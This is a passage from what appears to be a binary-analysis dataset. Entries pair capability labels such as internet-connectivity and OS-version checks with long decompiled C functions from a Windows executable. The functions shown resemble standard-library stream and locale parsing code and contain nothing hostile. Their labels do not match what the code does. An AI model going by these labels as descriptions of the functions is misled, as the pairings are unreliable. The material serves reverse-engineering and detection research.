= fcn.140023f10(arg1_00, puVar3);\n                    if (cVar5 == '\\0') {\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c849;\n                        fcn.140023fd0(arg1_00);\n                        pcVar1 = *(*piVar11 + 0x20);\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c855;\n                        uVar6 = (*pcVar1)(piVar11);\n                        uVar17 = 0;\n                        var_68h = var_68h & 0xffffffffffffff00 | uVar6;\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c862;\n                        fcn.140023fd0(arg1_00);\n                        pcVar1 = *(*piVar11 + 0x10);\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c86e;\n                        uVar6 = (*pcVar1)(piVar11);\n                        ppiVar14 = ppiStack136;\n                        uStack184._7_1_ = cVar5;\n                        puStack120 = puStack120 & 0xffffffffffffff00 | uVar6;\n                        piStack128 = piVar13;\n                        do {\n                            if (piVar19 < ppiVar14[uVar17]) {\n                                pcVar1 = *(*piVar11 + 0x20);\n                                *(&stack0xffffffffffffff20 + iVar12) = 0x14005c8aa;\n                                cVar5 = (*pcVar1)(piVar11);\n                                if (var_68h != cVar5) {\n                                    pcVar1 = *(*piVar11 + 0x10);\n                                    *(&stack0xffffffffffffff20 + iVar12) = 0x14005c8bf;\n                                    cVar5 = (*pcVar1)(piVar11);\n                                    if (puStack120 != cVar5) goto code_r0x00014005c8c8;\n                                }\n                                piVar13 = piStack128;\n                                cVar5 = '\\x01';\n                                break;\n                            }\ncode_r0x00014005c8c8:\n                            uVar17 = uVar17 + 1;\n                            piVar13 = piStack128;\n                            cVar5 = uStack184._7_1_;\n                        } while (uVar17 != uVar22);\n                    }\n                    else {\n                        cVar5 = '\\0';\n                    }\n                    uVar17 = 0;\n                    do {\n                        if ((piVar19 == piVar13) == cVar5) {\n                            uVar22 = uVar22 - 1;\n                            iStack144 = uVar22 * 8;\n                            puVar4[uVar17] = puVar4[uVar22];\n                            ppiStack136[uVar17] = ppiStack136[uVar22];\n                            if (uVar22 <= uVar17) goto code_r0x00014005c929;\n                        }\n                        else {\n                            uVar17 = uVar17 + 1;\n                            if (uVar22 <= uVar17) goto code_r0x00014005c929;\n                        }\n                        piVar13 = ppiStack136[uVar17];\n                    } while( true );\n                }\n                var_48h._0_4_ = -1;\n                if (piVar19 < piVar16) goto code_r0x00014005c690;\n                goto code_r0x00014005c53a;\n            }\n            piVar19 = NULL;\ncode_r0x00014005c53a:\n            piVar13 = var_50h_2;\n            if (uVar22 == 1) {\n                piVar19 = piVar19 + 1;\n                *(&stack0xffffffffffffff20 + iVar12) = 0x14005c551;\n                fcn.140095670(piVar13);\n                var_48h._0_4_ = -1;\ncode_r0x00014005c558:\n                piStack128 = *puVar4;\ncode_r0x00014005c55c:\n                puStack120 = *ppiStack136;\n                if (piVar19 < puStack120) {\n                    bVar23 = var_58h == -1;\n                    var_68h = *(noname_5 + piStack128 * 8);\n                    piVar13 = var_50h_2;\n                    do {\n                        bVar24 = var_48h == -1;\n                        bVar8 = piVar13 != NULL && bVar24;\n                        ppiStack136._0_1_ = bVar24;\n                        if (bVar8) {\n                            if (piVar13[3] <= piVar13[2]) {\n                                ppiStack136 = ppiStack136 & 0xffffffffffffff00 | bVar8;\n                                pcVar1 = *(*piVar13 + 0x48);\n                                *(&stack0xffffffffffffff20 + iVar12) = 0x14005cacb;\n                                iVar10 = (*pcVar1)(piVar13);\n                                if (iVar10 == -1) {\n                                    var_50h_2 = NULL;\n                                    goto code_r0x00014005c5b2;\n                                }\n                            }\n                            ppiStack136._0_1_ = 0;\n                        }\ncode_r0x00014005c5b2:\n                        bVar9 = var_60h != NULL && bVar23;\n                        bVar8 = bVar23;\n                        if (bVar9) {\n                            if (var_60h[3] <= var_60h[2]) {\n                                ppiStack136 = ppiStack136 & 0xffffffffffffff00 | ppiStack136;\n                                pcVar1 = *(*var_60h + 0x48);\n                                *(&stack0xffffffffffffff20 + iVar12) = 0x14005cb12;\n                                iVar10 = (*pcVar1)();\n                                if (iVar10 == -1) {\n                                    var_60h = NULL;\n                                    bVar8 = bVar9;\n                                    goto code_r0x00014005c5cb;\n                                }\n                            }\n                            if (ppiStack136 == 0) goto code_r0x00014005ca1d;\n                        }\n                        else {\ncode_r0x00014005c5cb:\n                            if (ppiStack136 == bVar8) goto code_r0x00014005ca1d;\n                        }\n                        pcVar1 = *(*piVar11 + 0x20);\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c5e5;\n                        cVar5 = (*pcVar1)(piVar11);\n                        piVar13 = var_50h_2;\n                        if (((var_50h_2 != NULL) && (bVar24)) && (var_50h_2[3] <= var_50h_2[2])) {\n                            pcVar1 = *(*var_50h_2 + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar12) = 0x14005caee;\n                            iVar10 = (*pcVar1)(piVar13);\n                            if (iVar10 == -1) {\n                                var_50h_2 = NULL;\n                                piVar13 = NULL;\n                            }\n                        }\n                        pcVar1 = *(*piVar11 + 0x20);\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c608;\n                        cVar7 = (*pcVar1)(piVar11);\n                        if (cVar7 != cVar5) {\n                            pcVar1 = *(*piVar11 + 0x10);\n                            *(&stack0xffffffffffffff20 + iVar12) = 0x14005c61e;\n                            cVar5 = (*pcVar1)(piVar11);\n                            if (((piVar13 != NULL) && (bVar24)) && (piVar13[3] <= piVar13[2])) {\n                                pcVar1 = *(*piVar13 + 0x48);\n                                *(&stack0xffffffffffffff20 + iVar12) = 0x14005cb35;\n                                iVar10 = (*pcVar1)(piVar13);\n                                if (iVar10 == -1) {\n                                    var_50h_2 = NULL;\n                                }\n                            }\n                            pcVar1 = *(*piVar11 + 0x10);\n                            *(&stack0xffffffffffffff20 + iVar12) = 0x14005c63b;\n                            cVar7 = (*pcVar1)(piVar11);\n                            piVar13 = var_50h_2;\n                            if (cVar7 != cVar5) goto code_r0x00014005ca1d;\n                        }\n                        if (piVar13[2] < piVar13[3]) {\n                            piVar13[2] = piVar13[2] + 1;\n                        }\n                        else {\n                            pcVar1 = *(*piVar13 + 0x50);\n                            *(&stack0xffffffffffffff20 + iVar12) = 0x14005ca4f;\n                            (*pcVar1)(piVar13);\n                        }\n                        var_48h._0_4_ = -1;\n                        piVar19 = piVar19 + 1;\n                    } while (puStack120 != piVar19);\n                    uVar18 = SUB84(piStack128, 0);\n                }\n                else {\ncode_r0x00014005ca1d:\n                    uVar18 = SUB84(piStack128, 0);\n                    if (puStack120 != piVar19) goto code_r0x00014005c3be;\n                }\n                *noname_4 = uVar18;\n                goto code_r0x00014005c3c8;\n            }\n        }\n    }\ncode_r0x00014005c3be:\n    *var_50h = *var_50h | 4;\ncode_r0x00014005c3c8:\n    *arg1 = var_50h_2._0_4_;\n    arg1[1] = var_50h_2._4_4_;\n    arg1[2] = var_48h;\n    arg1[3] = var_48h._4_4_;\n    return;\ncode_r0x00014005c929:\n    if (cVar5 == '\\0') {\n        if (uVar22 != 2) {\n            if (uVar22 != 1) goto code_r0x00014005c3be;\n            goto code_r0x00014005c558;\n        }\n        if ((uStack168 & 1) != 0) goto code_r0x00014005c3be;\n        piStack128 = *puVar4;\n        uVar17 = uStack168 >> 1;\n        if (piStack128 < uVar17) {\n            if (uVar17 + piStack128 == puVar4[1]) goto code_r0x00014005c55c;\n            goto code_r0x00014005c3be;\n        }\n        if (piStack128 - uVar17 != puVar4[1]) goto code_r0x00014005c3be;\n        *puVar4 = piStack128 - uVar17;\n        *ppiStack136 = ppiStack136[1];\n        piStack128 = *puVar4;\n        goto code_r0x00014005c55c;\n    }\n    piVar13 = *ppiStack136;\n    if (1 < uVar22) {\n        ppiVar14 = ppiStack152;\n        do {\n            if (*ppiVar14 < piVar13) {\n                piVar13 = *ppiVar14;\n            }\n            ppiVar14 = ppiVar14 + 1;\n        } while (ppiStack136 + iStack144 != ppiVar14);\n    }\n    if (piVar13 <= piVar19) goto code_r0x00014005c53a;\n    var_68h._0_1_ = var_48h == -1;\n    bVar23 = var_68h;\n    if ((var_50h_2 != NULL) && (piVar15 = var_50h_2,  var_68h)) {\ncode_r0x00014005c690:\n        if (piVar15[3] <= piVar15[2]) {\n            pcVar1 = *(*piVar15 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar12) = 0x14005ca5a;\n            iVar10 = (*pcVar1)();\n            if (iVar10 == -1) {\n                var_50h_2 = NULL;\n                var_68h._0_1_ = true;\n                bVar23 = true;\n                goto code_r0x00014005c6b0;\n            }\n        }\n        var_68h._0_1_ = false;\n        bVar23 = true;\n    }\ncode_r0x00014005c6b0:\n    bVar24 = var_60h != NULL && var_58h == -1;\n    bVar8 = var_58h == -1;\n    if (bVar24) {\n        if (var_60h[3] <= var_60h[2]) {\n            var_68h = var_68h & 0xffffffffffffff00 | var_68h;\n            pcVar1 = *(*var_60h + 0x48);\n            *(&stack0xffffffffffffff20 + iVar12) = 0x14005c9b3;\n            iVar10 = (*pcVar1)();\n            if (iVar10 == -1) {\n                var_60h = NULL;\n                bVar8 = bVar24;\n                goto code_r0x00014005c6cb;\n            }\n        }\n        bVar8 = false;\n    }\ncode_r0x00014005c6cb:\n    piVar13 = var_50h_2;\n    if (var_68h == bVar8) goto code_r0x00014005c53a;\n    if ((var_50h_2 == NULL) || (!bVar23)) {\ncode_r0x00014005c6e7:\n        pcVar1 = *(*piVar11 + 0x20);\n        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c6f3;\n        uVar6 = (*pcVar1)(piVar11);\n        puStack120 = puStack120 & 0xffffffffffffff00 | uVar6;\n    }\n    else {\n        if (var_50h_2[3] <= var_50h_2[2]) {\n            pcVar1 = *(*var_50h_2 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar12) = 0x14005caa7;\n            iVar10 = (*pcVar1)(piVar13);\n            if (iVar10 == -1) {\n                var_50h_2 = NULL;\n                goto code_r0x00014005c6e7;\n            }\n        }\n        pcVar1 = *(*piVar11 + 0x20);\n        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c7cd;\n        uVar6 = (*pcVar1)(piVar11);\n        puStack120 = puStack120 & 0xffffffffffffff00 | uVar6;\n        if (piVar13[3] <= piVar13[2]) {\n            pcVar1 = *(*piVar13 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar12) = 0x14005ca86;\n            iVar10 = (*pcVar1)(piVar13);\n            if (iVar10 == -1) {\n                var_50h_2 = NULL;\n            }\n        }\n    }\n    pcVar1 = *(*piVar11 + 0x10);\n    *(&stack0xffffffffffffff20 + iVar12) = 0x14005c702;\n    uVar6 = (*pcVar1)(piVar11);\n    if (uVar22 == 0) goto code_r0x00014005c3be;\n    var_68h = piVar19;\n    uVar17 = 0;\n    piStack128 = piStack128 & 0xffffffffffffff00 | uVar6;\n    do {\n        while( true ) {\n            pcVar1 = *(*piVar11 + 0x20);\n            *(&stack0xffffffffffffff20 + iVar12) = 0x14005c782;\n            cVar5 = (*pcVar1)(piVar11);\n            if (puStack120 != cVar5) break;\ncode_r0x00014005c787:\n            uVar17 = uVar17 + 1;\n            if (uVar22 <= uVar17) goto code_r0x00014005c790;\n        }\n        pcVar1 = *(*piVar11 + 0x10);\n        *(&stack0xffffffffffffff20 + iVar12) = 0x14005c72c;\n        cVar5 = (*pcVar1)(piVar11);\n        if (piStack128 == cVar5) goto code_r0x00014005c787;\n        uVar22 = uVar22 - 1;\n        iStack144 = uVar22 * 8;\n        puVar4[uVar17] = puVar4[uVar22];\n        ppiStack136[uVar17] = ppiStack136[uVar22];\n    } while (uVar17 < uVar22);\ncode_r0x00014005c790:\n    piVar19 = var_68h;\n    if (uVar22 < 2) goto code_r0x00014005c53a;\n    piVar13 = *ppiStack136;\n    goto code_r0x00014005c4d8;\n}\n",
        "token_count": 5845
    },
    "14005ee3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14005ee30(uint *arg1, ulong noname_1, uint64_t **noname_2, uint64_t **arg4, int32_t *noname_4, int64_t noname_5\n                  , int64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11\n                  , ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    ulong uVar3;\n    bool bVar4;\n    uint8_t uVar5;\n    char cVar6;\n    char cVar7;\n    int32_t iVar8;\n    int64_t *piVar9;\n    int64_t iVar10;\n    uint64_t *puVar11;\n    int64_t iVar12;\n    uint8_t uVar13;\n    bool bVar14;\n    uint64_t *puVar15;\n    uchar *puVar16;\n    uint64_t uVar17;\n    uint64_t uVar18;\n    int32_t *piVar19;\n    uint64_t *puVar20;\n    bool bVar21;\n    uint64_t *puVar22;\n    uint64_t *puVar23;\n    uint8_t uVar24;\n    ulong var_8h_2;\n    int32_t iVar25;\n    uint32_t *var_bp_50h;\n    ulong uStack160;\n    uchar auStack152 [32];\n    ulong uStack120;\n    uint64_t *puStack112;\n    uint64_t *puStack104;\n    uint64_t *puStack96;\n    ulong uStack88;\n    uint32_t uStack80;\n    uint uStack76;\n    ulong var_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    puVar23 = *arg4;\n    uStack88 = *noname_2;\n    uStack80 = *(noname_2 + 1);\n    uStack76 = *(noname_2 + 0xc);\n    puVar11 = arg4[1];\n    noname_7 = noname_7 + 0xd0;\n    uStack160 = 0x14005ee77;\n    puStack96 = puVar23;\n    piVar9 = fcn.1400b36a0(noname_7);\n    uStack160 = 0x14005ee92;\n    iVar10 = fcn.14000e880(noname_7);\n    iVar10 = -iVar10;\n    puVar16 = &stack0xffffffffffffff68 + iVar10;\n    piVar1 = &stack0xffffffffffffff88 + iVar10;\n    bVar4 = uStack88 != NULL && uStack80 == 0xffffffff;\n    puVar15 = puStack96;\n    puStack104._0_4_ = uStack80;\n    bVar21 = uStack80 == 0xffffffff;\n    if (bVar4) {\n        if (uStack88[3] <= uStack88[2]) {\n            puStack104 = puStack96;\n            puStack96 = puStack96 & 0xffffffff00000000 | uStack80;\n            pcVar2 = *(*uStack88 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar10) = 0x14005f295;\n            iVar8 = (*pcVar2)();\n            puVar15 = puStack104;\n            puStack104._0_4_ = puStack96;\n            if (iVar8 == -1) {\n                uStack88 = NULL;\n                bVar21 = bVar4;\n                goto code_r0x00014005eec0;\n            }\n        }\n        bVar21 = false;\n    }\ncode_r0x00014005eec0:\n    uVar24 = puVar11 == -1;\n    bVar14 = puVar15 != NULL && uVar24;\n    bVar4 = uVar24;\n    if (bVar14) {\n        if (puVar15[2] < puVar15[3]) {\n            bVar4 = false;\n        }\n        else {\n            puStack104 = puStack104 & 0xffffffff00000000 | puStack104;\n            puStack96 = puVar15;\n            pcVar2 = *(*puVar15 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar10) = 0x14005f2e2;\n            iVar8 = (*pcVar2)(puVar15);\n            puVar23 = NULL;\n            if (iVar8 != -1) {\n                puVar23 = puStack96;\n            }\n            bVar4 = iVar8 == -1 && bVar14;\n        }\n    }\n    if (bVar21 == bVar4) {\n        uVar17 = 0;\n        puVar11 = uStack88;\n        puVar15 = NULL;\n        puVar16 = &stack0xffffffffffffff68 + iVar10;\n        puVar20 = NULL;\n    }\n    else {\n        *(&stack0xffffffffffffff60 + iVar10) = 0x14005f0c5;\n        cVar6 = fcn.140023fd0(&stack0xffffffffffffffa8);\n        uVar17 = noname_6 * 2;\n        if (uVar17 == 0) {\n            puVar15 = NULL;\n            puVar20 = NULL;\n            puVar11 = uStack88;\n            puStack104._0_4_ = uStack80;\n        }\n        else {\n            uVar18 = 0;\n            puStack96 = puVar23;\n            puVar15 = NULL;\n            puStack104 = puStack104 & 0xffffffffffffff00 | uVar24;\n            do {\n                while (**(noname_5 + uVar18 * 8) == cVar6) {\ncode_r0x00014005f11c:\n                    piVar1[puVar15] = uVar18;\n                    uVar18 = uVar18 + 1;\n                    puVar15 = puVar15 + 1;\n                    if (uVar18 == uVar17) goto code_r0x00014005f12e;\n                }\n                pcVar2 = *(*piVar9 + 0x10);\n                *(&stack0xffffffffffffff60 + iVar10) = 0x14005f102;\n                cVar7 = (*pcVar2)(piVar9);\n                if (cVar6 == cVar7) goto code_r0x00014005f11c;\n                uVar18 = uVar18 + 1;\n            } while (uVar18 != uVar17);\ncode_r0x00014005f12e:\n            puVar11 = uStack88;\n            puVar23 = puStack96;\n            uVar24 = puStack104;\n            if (puVar15 == NULL) {\n                uVar17 = 0;\n                puVar16 = &stack0xffffffffffffff68 + iVar10;\n                puVar20 = NULL;\n                puStack104._0_4_ = uStack80;\n            }\n            else {\n                puStack112 = uStack88;\n                *(&stack0xffffffffffffff60 + iVar10) = 0x14005f159;\n                fcn.140095670(puVar11);\n                uStack80 = 0xffffffff;\n                *(&stack0xffffffffffffff60 + iVar10) = 0x14005f171;\n                iVar12 = fcn.14000e880(puVar11);\n                iVar12 = -iVar12;\n                puVar16 = &stack0xffffffffffffff68 + iVar12 + iVar10;\n                puStack96 = puVar15;\n                puStack104 = &stack0xffffffffffffff88 + iVar12 + iVar10;\n                puVar11 = &stack0xffffffffffffff88 + iVar12 + iVar10;\n                piVar19 = piVar1;\n                do {\n                    iVar8 = *piVar19;\n                    piVar19 = piVar19 + 1;\n                    uVar3 = *(noname_5 + iVar8 * 8);\n                    *(&stack0xffffffffffffff60 + iVar12 + iVar10) = 0x14005f1a4;\n                    uVar17 = sub.msvcrt.dll_strlen(uVar3);\n                    *puVar11 = uVar17;\n                    puVar11 = puVar11 + 1;\n                } while (piVar1 + puVar15 != piVar19);\n                uVar17 = 1;\n                puStack104._0_4_ = 0xffffffff;\n                puVar11 = puStack112;\n                puVar15 = puStack96;\n                puVar20 = puStack104;\n            }\n        }\n    }\n    do {\n        puStack104._0_1_ = puStack104 == 0xffffffff;\n        bVar21 = puVar11 != NULL && puStack104;\n        puStack96._0_1_ = puStack104;\n        if (bVar21) {\n            if (puVar11[3] <= puVar11[2]) {\n                puStack112 = puStack112 & 0xffffffff00000000 | puStack104;\n                puStack104 = puStack104 & 0xffffffffffffff00 | puStack104;\n                puStack96 = puStack96 & 0xffffffffffffff00 | bVar21;\n                pcVar2 = *(*puVar11 + 0x48);\n                *(puVar16 + -8) = 0x14005f244;\n                iVar8 = (*pcVar2)();\n                puStack104._0_4_ = puStack112;\n                if (iVar8 == -1) {\n                    uStack88 = NULL;\n                    goto code_r0x00014005ef0b;\n                }\n            }\n            puStack96._0_1_ = 0;\n        }\ncode_r0x00014005ef0b:\n        uVar5 = puVar23 != NULL & uVar24;\n        uVar13 = uVar24;\n        if (uVar5 != 0) {\n            if (puVar23[2] < puVar23[3]) {\n                uVar13 = 0;\n            }\n            else {\n                uStack120._4_4_ = puStack104;\n                puStack112 = puStack112 & 0xffffffffffffff00 | puStack104;\n                puStack104 = puStack104 & 0xffffffffffffff00 | uVar5;\n                puStack96 = puStack96 & 0xffffffffffffff00 | puStack96;\n                pcVar2 = *(*puVar23 + 0x48);\n                *(puVar16 + -8) = 0x14005f20c;\n                iVar8 = (*pcVar2)(puVar23);\n                puStack104._0_4_ = uStack120._4_4_;\n                if (iVar8 == -1) {\n                    puVar23 = NULL;\n                    uVar13 = puStack104;\n                    puStack104._0_1_ = puStack112;\n                }\n                else {\n                    uVar13 = 0;\n                    puStack104._0_1_ = puStack112;\n                }\n            }\n        }\n        if (puStack96 == uVar13) break;\n        if ((uStack88 != NULL) && (puStack104 != 0)) {\n            if (uStack88[2] < uStack88[3]) {\n                puStack104._0_4_ = *uStack88[2];\n            }\n            else {\n                pcVar2 = *(*uStack88 + 0x48);\n                *(puVar16 + -8) = 0x14005f26e;\n                puStack104._0_4_ = (*pcVar2)();\n                if (puStack104 == 0xffffffff) {\n                    uStack88 = NULL;\n                }\n            }\n        }\n        if (puVar15 == NULL) goto code_r0x00014005efe8;\n        puVar11 = NULL;\n        puVar22 = NULL;\n        do {\n            while (puVar20[puVar11] <= uVar17) {\n                puVar22 = puVar22 + 1;\ncode_r0x00014005ef58:\n                puVar11 = puVar11 + 1;\n                if (puVar15 <= puVar11) goto code_r0x00014005ef90;\n            }\n            if (*(*(noname_5 + piVar1[puVar11] * 8) + uVar17) == puStack104) goto code_r0x00014005ef58;\n            puVar15 = puVar15 + -1;\n            piVar1[puVar11] = piVar1[puVar15];\n            puVar20[puVar11] = puVar20[puVar15];\n        } while (puVar11 < puVar15);\ncode_r0x00014005ef90:\n        if (puVar15 == puVar22) break;\n        if (uStack88[2] < uStack88[3]) {\n            uStack88[2] = uStack88[2] + 1;\n            puVar11 = uStack88;\n        }\n        else {\n            puStack96 = uStack88;\n            pcVar2 = *(*uStack88 + 0x50);\n            *(puVar16 + -8) = 0x14005f07a;\n            (*pcVar2)();\n            puVar11 = puStack96;\n        }\n        uStack80 = 0xffffffff;\n        uVar17 = uVar17 + 1;\n        puStack104._0_4_ = 0xffffffff;\n    } while( true );\n    if (puVar15 == 0x1) {\n        uVar18 = *puVar20;\njoined_r0x00014005f096:\n        if (uVar18 == uVar17) {\ncode_r0x00014005f09c:\n            iVar8 = *piVar1;\n            if (iVar25 <= iVar8) {\n                iVar8 = iVar8 - iVar25;\n            }\n            *noname_4 = iVar8;\n            goto code_r0x00014005eff2;\n        }\n    }\n    else if (puVar15 == 0x2) {\n        if (*puVar20 != uVar17) {\n            uVar18 = puVar20[1];\n            goto joined_r0x00014005f096;\n        }\n        goto code_r0x00014005f09c;\n    }\ncode_r0x00014005efe8:\n    *var_bp_50h = *var_bp_50h | 4;\ncode_r0x00014005eff2:\n    *arg1 = uStack88;\n    arg1[1] = uStack88._4_4_;\n    arg1[2] = uStack80;\n    arg1[3] = uStack76;\n    return;\n}\n",
        "token_count": 3327
    },
    "140060e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140060e80(uint *arg1, ulong noname_1, int64_t **noname_2, int64_t **noname_3, uint *noname_4, int64_t noname_5\n                  , uint64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, \n                  ulong noname_11, ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    uint64_t *puVar1;\n    code *pcVar2;\n    ulong uVar3;\n    bool bVar4;\n    ulong *puVar5;\n    ulong *arg1_00;\n    char cVar6;\n    uint8_t uVar7;\n    ushort uVar8;\n    uint16_t uVar9;\n    int16_t iVar10;\n    int16_t iVar11;\n    uint32_t uVar12;\n    int64_t *piVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    uint64_t *puVar16;\n    uint32_t uVar17;\n    int64_t *piVar18;\n    uint64_t uVar19;\n    uint uVar20;\n    uint64_t uVar21;\n    uint64_t uVar22;\n    bool bVar23;\n    bool bVar24;\n    ulong var_8h;\n    uint32_t *var_50h;\n    ulong auStack240 [5];\n    uint64_t auStack200 [2];\n    ulong *puStack184;\n    uint64_t uStack176;\n    ulong *puStack168;\n    uint64_t *puStack160;\n    uint64_t uStack152;\n    int64_t iStack144;\n    uint64_t *puStack136;\n    uint64_t *var_78h;\n    uint64_t var_70h;\n    ulong var_68h;\n    int64_t *var_60h;\n    ulong var_58h;\n    int64_t *var_50h_2;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h_2;\n    \n    var_50h_2 = *noname_2;\n    var_48h._0_4_ = *(noname_2 + 1);\n    var_48h._4_4_ = *(noname_2 + 0xc);\n    var_60h = *noname_3;\n    var_58h._0_4_ = *(noname_3 + 1);\n    var_58h._4_4_ = *(noname_3 + 0xc);\n    noname_7 = noname_7 + 0xd0;\n    auStack240[0] = 0x140060ecb;\n    piVar13 = fcn.1400b3700(noname_7);\n    auStack240[0] = 0x140060eda;\n    iVar14 = fcn.14000e880(noname_7);\n    iVar14 = -iVar14;\n    puStack184 = &fcn.140060e80::var_60h;\n    puStack168 = &fcn.140060e80::var_50h_2;\n    *(&stack0xffffffffffffff10 + iVar14) = 0x140060efa;\n    cVar6 = fcn.140024020(&fcn.140060e80::var_50h_2, &fcn.140060e80::var_60h);\n    puVar5 = puStack168;\n    if (cVar6 == '\\0') {\n        *(&stack0xffffffffffffff10 + iVar14) = 0x140060f2e;\n        uVar8 = fcn.1400240d0(puVar5);\n        pcVar2 = *(*piVar13 + 0x40);\n        *(&stack0xffffffffffffff10 + iVar14) = 0x140060f3e;\n        var_68h._6_2_ = (*pcVar2)(piVar13, uVar8);\n        pcVar2 = *(*piVar13 + 0x30);\n        *(&stack0xffffffffffffff10 + iVar14) = 0x140060f4e;\n        uVar9 = (*pcVar2)(piVar13, uVar8);\n        if (noname_6 != 0) {\n            puStack136 = &stack0xffffffffffffff38 + iVar14;\n            var_78h = &stack0xffffffffffffff38 + iVar14 + noname_6 * 8;\n            var_70h = var_70h & 0xffffffffffff0000 | uVar9;\n            uVar22 = 0;\n            uVar15 = 0;\n            do {\n                while( true ) {\n                    uVar21 = uVar15;\n                    uVar8 = **(noname_5 + uVar21 * 8);\n                    pcVar2 = *(*piVar13 + 0x40);\n                    *(&stack0xffffffffffffff10 + iVar14) = 0x140060f91;\n                    uVar9 = (*pcVar2)(piVar13, uVar8);\n                    if (var_68h._6_2_ != uVar9) break;\ncode_r0x000140060fad:\n                    uVar3 = *(noname_5 + uVar21 * 8);\n                    uVar19 = uVar22 + 1;\n                    puVar1 = var_78h + uVar22;\n                    *(&stack0xffffffffffffff10 + iVar14) = 0x140060fca;\n                    uVar15 = sub.msvcrt.dll_wcslen(uVar3);\n                    *puVar1 = uVar15;\n                    puStack136[uVar22] = uVar21;\n                    uVar22 = uVar19;\n                    uVar15 = uVar21 + 1;\n                    if (noname_6 == uVar21 + 1) goto code_r0x000140060fdf;\n                }\n                pcVar2 = *(*piVar13 + 0x30);\n                *(&stack0xffffffffffffff10 + iVar14) = 0x140060fa7;\n                iVar10 = (*pcVar2)(piVar13);\n                if (var_70h == iVar10) goto code_r0x000140060fad;\n                uVar15 = uVar21 + 1;\n            } while (noname_6 != uVar21 + 1);\ncode_r0x000140060fdf:\n            puVar1 = puStack136;\n            if (1 < uVar22) {\n                uStack176 = uVar21 + 1;\n                uStack152 = 0;\n                uVar15 = *var_78h;\n                iStack144 = uVar22 * 8;\n                puStack160 = var_78h + 1;\ncode_r0x000140061020:\n                piVar18 = var_50h_2;\n                puVar16 = puStack160;\n                uVar21 = uVar15;\n                do {\n                    if (*puVar16 < uVar21) {\n                        uVar21 = *puVar16;\n                    }\n                    puVar16 = puVar16 + 1;\n                } while (var_78h + iStack144 != puVar16);\n                uStack152 = uStack152 + 1;\n                if (var_50h_2[2] < var_50h_2[3]) {\n                    var_50h_2[2] = var_50h_2[2] + 2;\n                    puVar5 = puStack184;\n                    arg1_00 = puStack168;\n                }\n                else {\n                    pcVar2 = *(*var_50h_2 + 0x50);\n                    *(&stack0xffffffffffffff10 + iVar14) = 0x1400613c9;\n                    (*pcVar2)(piVar18);\n                    puVar5 = puStack184;\n                    arg1_00 = puStack168;\n                }\n                var_48h._0_4_ = CONCAT22(var_48h._2_2_, 0xffff);\n                puStack184 = puVar5;\n                puStack168 = arg1_00;\n                if (uStack152 == uVar21) {\n                    *(&stack0xffffffffffffff10 + iVar14) = 0x1400613ec;\n                    uVar7 = fcn.140024020(arg1_00, puVar5);\n                    var_70h = var_70h & 0xffffffffffffff00 | uVar7;\n                    if (uVar7 == 0) {\n                        uVar19 = 0;\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x140061402;\n                        fcn.1400240d0(arg1_00);\n                        pcVar2 = *(*piVar13 + 0x40);\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x14006140e;\n                        var_68h._6_2_ = (*pcVar2)(piVar13);\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x14006141a;\n                        fcn.1400240d0(arg1_00);\n                        pcVar2 = *(*piVar13 + 0x30);\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x140061426;\n                        uVar9 = (*pcVar2)(piVar13);\n                        auStack200[1] = uVar15;\n                        puStack136 = puStack136 & 0xffffffffffff0000 | uVar9;\n                        var_68h._5_1_ = var_70h;\n                        var_70h = uStack152 * 2;\n                        do {\n                            if (uVar21 < var_78h[uVar19]) {\n                                pcVar2 = *(*piVar13 + 0x40);\n                                *(&stack0xffffffffffffff10 + iVar14) = 0x140061475;\n                                uVar9 = (*pcVar2)(piVar13);\n                                if (var_68h._6_2_ != uVar9) {\n                                    pcVar2 = *(*piVar13 + 0x30);\n                                    *(&stack0xffffffffffffff10 + iVar14) = 0x14006148b;\n                                    iVar10 = (*pcVar2)(piVar13);\n                                    if (puStack136 